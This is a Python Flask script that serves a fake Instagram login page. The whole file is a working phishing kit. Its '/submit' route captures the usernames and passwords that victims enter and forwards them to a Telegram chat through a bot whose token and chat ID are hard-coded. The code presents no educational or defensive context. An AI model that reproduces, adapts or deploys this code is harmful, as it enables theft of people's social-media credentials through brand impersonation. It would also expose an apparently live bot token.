from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6752205626:AAFmvEgnj6j_jl1WmqSowQeSAQqYW_yo4hQ'
TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID

html_code = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login . Instagram</title>
    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
    <style>
        /* ... (your CSS code) ... */
    </style>
</head>
<body>

<div class="container">
    <div class="box">
        <div class="heading"></div>
        <form class="login-form" action="/submit" method="post">
            <div class="field">
                <input type="text" id="name" name="name" placeholder="Phone number, username, or email" />
                <label for="name">Name</label>
            </div>
            <div class="field">
                <input  id="password" name="password" type="password" placeholder="password" />
                <label for="password">Password</label>
            </div>
            <input class="login-button" type="submit" value="Submit">
            <div class="separator">
                <div class="line"></div>
                <p>OR</p>
                <div class="line"></div>
            </div>
            <div class="other">
                <button class="fb-login-btn" type="button">
                    <i class="fa fa-facebook-official fb-icon"></i>
                    <span class="">
                        <img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png" height="15" width="15">
                        <a href="facebook-login.html">&nbsp;Log in with Facebook</a>
                    </span>
                </button>
                <a class="forgot-password" href="/forget.html">Forgot password?</a>
            </div>
        </form>
    </div>
    <div class="box">
        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
    </div>
</div>

</body>
</html>
"""

@app.route('/')
def show_form():
    return html_code

@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        name = request.form.get('name')
        password = request.form.get('password')

        message = f"New form submission:\nName: {name}\nPassword: {password}"
        send_message_to_telegram(message)

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def send_message_to_telegram(message):
    telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(telegram_api_url, params=params)
    response.raise_for_status()

if __name__ == '__main__':
    app.run(debug=True)
